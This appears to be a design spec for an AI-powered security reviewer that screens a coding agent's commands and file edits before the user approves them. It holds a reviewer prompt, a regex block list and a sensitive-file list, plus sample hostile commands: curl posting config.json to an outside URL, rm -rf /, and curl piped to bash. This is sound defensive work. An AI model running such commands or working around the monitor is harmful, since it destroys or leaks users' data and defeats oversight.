# AI Security Review

## Summary

An optional AI-powered review layer that analyzes agent changes and commands for security issues before user approval, helping catch obviously malicious or dangerous operations.

## Motivation

The current workflow is:
1. Agent makes changes / requests command
2. User reviews and approves/denies

Problems:
- Users may approve dangerous operations due to fatigue or inattention
- Subtle malicious patterns are hard to spot manually
- Security expertise varies among users
- Review burden increases with agent count

An AI security reviewer can:
- Flag obviously dangerous operations (`rm -rf /`, credential access)
- Detect suspicious patterns (data exfiltration, backdoors)
- Provide security context to help user decide
- Reduce cognitive load by pre-screening

## Design

### Review Layer

```
┌─────────────────────────────────────────────────────────┐
│                                                         │
│  Agent Request                                          │
│       │                                                 │
│       ▼                                                 │
│  ┌─────────────┐                                        │
│  │ AI Security │ ← Fast model analyzes request         │
│  │   Review    │                                        │
│  └──────┬──────┘                                        │
│         │                                               │
│    ┌────┴────┐                                          │
│    ▼         ▼                                          │
│ [SAFE]   [FLAGGED]                                      │
│    │         │                                          │
│    ▼         ▼                                          │
│ Normal   Highlighted                                    │
│ approval approval with                                  │
│ UI       warnings                                       │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### What Gets Reviewed

**Commands (Bash)**:
- Destructive operations (`rm -rf`, `chmod 777`, etc.)
- Network operations (`curl`, `wget`, posting data)
- Credential access (reading `.env`, keys, tokens)
- System modifications (`sudo`, package installs)
- Suspicious patterns (base64 encoding, obfuscation)

**File Changes**:
- Modifications to sensitive files (.env, configs, credentials)
- New executable files or scripts
- Changes to authentication/authorization code
- Network request modifications
- Obfuscated or minified code additions

**Patterns to detect**:
- Data exfiltration (sending data to external URLs)
- Backdoors (hardcoded credentials, bypass logic)
- Supply chain attacks (malicious dependencies)
- Privilege escalation
- Destructive operations

### Review Results

**Safe (Green)**:
```
┌─────────────────────────────────────────────────────────┐
│ ✓ Security Review: SAFE                                 │
│                                                         │
│ Bash: npm install lodash                                │
│                                                         │
│ Analysis: Standard package installation from npm.       │
│ No security concerns detected.                          │
│                                                         │
│              [✓ Approve]      [✗ Deny]                 │
└─────────────────────────────────────────────────────────┘
```

**Flagged (Yellow/Orange)**:
```
┌─────────────────────────────────────────────────────────┐
│ ⚠ Security Review: REVIEW CAREFULLY                     │
│                                                         │
│ Bash: curl -X POST https://api.example.com/data        │
│       -d "$(cat config.json)"                          │
│                                                         │
│ ⚠ Concerns:                                            │
│ • Sending local file contents to external URL           │
│ • config.json may contain sensitive data                │
│                                                         │
│ Recommendation: Verify this URL is expected and         │
│ config.json doesn't contain secrets.                    │
│                                                         │
│              [✓ Approve Anyway]  [✗ Deny]              │
└─────────────────────────────────────────────────────────┘
```

**Dangerous (Red)**:
```
┌─────────────────────────────────────────────────────────┐
│ 🛑 Security Review: DANGEROUS                           │
│                                                         │
│ Bash: rm -rf /                                          │
│                                                         │
│ 🛑 CRITICAL:                                           │
│ • This command will delete all files on the system      │
│ • This is almost certainly not what you want            │
│ • Potential data loss is catastrophic                   │
│                                                         │
│ This request has been auto-blocked.                     │
│                                                         │
│              [Override & Approve]  [✓ Deny]            │
└─────────────────────────────────────────────────────────┘
```

### Settings UI

```
┌─────────────────────────────────────────────────────────┐
│ AI Security Review                                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│ Enable Security Review:                                 │
│ [✓] Review bash commands                                │
│ [✓] Review file changes                                 │
│ [ ] Review all file reads (verbose)                     │
│                                                         │
│ ─────────────────────────────────────────────────────── │
│                                                         │
│ Review Model: [claude-haiku ▼]                         │
│ (Fast model recommended for low latency)                │
│                                                         │
│ ─────────────────────────────────────────────────────── │
│                                                         │
│ Auto-block dangerous operations:                        │
│ [✓] Block rm -rf with wide paths                       │
│ [✓] Block sudo commands                                 │
│ [✓] Block credential file modifications                 │
│ [ ] Block all network operations                        │
│                                                         │
│ ─────────────────────────────────────────────────────── │
│                                                         │
│ Sensitivity: [Medium ▼]                                │
│ • Low: Only flag obvious dangers                        │
│ • Medium: Flag suspicious patterns (recommended)        │
│ • High: Flag anything unusual (verbose)                 │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### Implementation

**Review Prompt Template**:
```
You are a security reviewer analyzing an AI agent's request.

Request Type: {type}
Request: {request}
Context: {recent_terminal_output}
Working Directory: {cwd}
Agent Task: {task_description}

Analyze this request for security concerns:
1. Is this request safe, suspicious, or dangerous?
2. What are the potential risks?
3. Does this align with the stated task?

Respond in JSON:
{
  "verdict": "safe" | "review" | "dangerous",
  "concerns": ["concern1", "concern2"],
  "recommendation": "brief recommendation for user",
  "confidence": 0.0-1.0
}
```

**Review Flow**:
1. Agent requests permission
2. Extension sends request + context to review model
3. Review model returns verdict
4. UI displays appropriate approval card based on verdict
5. User makes final decision

**Latency Mitigation**:
- Use fastest available model (Haiku)
- Show "Analyzing..." state briefly
- Cache verdicts for identical requests
- Allow user to skip review for trusted patterns

### Rule-Based Pre-Filter

Before AI review, apply fast rule-based checks:

```typescript
const DANGEROUS_PATTERNS = [
  /rm\s+-rf\s+\/(?!\w)/,           // rm -rf /
  /chmod\s+777/,                    // world-writable
  />\s*\/etc\//,                    // writing to /etc
  /curl.*\|\s*bash/,                // curl pipe to bash
  /eval\s*\(/,                      // eval in code
];

const SENSITIVE_FILES = [
  '.env', '.env.*',
  '*.pem', '*.key', '*.crt',
  'credentials.*', 'secrets.*',
  '.ssh/*', '.aws/*',
];
```

Rule-based catches obvious issues instantly without API call.

### Review History

Log all reviews for learning and audit:

```json
{
  "timestamp": "2024-12-10T14:30:52Z",
  "request": "npm install lodash",
  "verdict": "safe",
  "userDecision": "approved",
  "reviewLatency": 450
}
```

Over time:
- Identify false positives/negatives
- Tune sensitivity
- Build trusted pattern list

### Cost Considerations

**Per-review cost** (Haiku):
- ~500 input tokens (request + context)
- ~100 output tokens (verdict)
- ~$0.0003 per review

**Mitigation**:
- Cache identical requests
- Rule-based pre-filter catches obvious cases
- User can disable for trusted operations
- Batch reviews when possible

### Integration with Containerized Mode

In container mode, security review is less critical (container is sandboxed), but can still be useful for:
- Reviewing what the agent did before merge
- Catching issues before they enter codebase
- Learning about agent behavior

Option: "Review containerized agent changes before merge"

### Implementation Steps

1. **Rule-Based Filter**:
   - Dangerous pattern regex
   - Sensitive file list
   - Instant blocking for obvious issues
2. **AI Review Service**:
   - Prompt template
   - API call to review model
   - Response parsing
3. **Review Cache**:
   - Hash requests for cache key
   - TTL-based expiration
   - Persist across sessions
4. **UI Integration**:
   - Verdict-based card styling
   - Concerns display
   - Override options
5. **Settings UI**:
   - Enable/disable toggles
   - Sensitivity selector
   - Auto-block configuration
6. **Review History**:
   - Logging system
   - History viewer (optional)
7. **Cost Tracking**:
   - Count reviews
   - Estimate costs
   - Display in settings

## Open Questions

1. **False positive handling**: How to quickly mark patterns as safe?
2. **Offline mode**: Fall back to rules-only when no API access?
3. **Custom rules**: Let users add their own dangerous patterns?
4. **Learning**: Use review history to improve over time?

## Dependencies

- Claude API access (Haiku model)
- Approval flow integration (see 009-ui-improvements.md)

## Risks

- API latency slows approvals → aggressive caching, fast model
- False positives annoy users → tunable sensitivity, easy override
- API costs → track and display, rule-based pre-filter
- Over-reliance → always position as "assistant", user decides
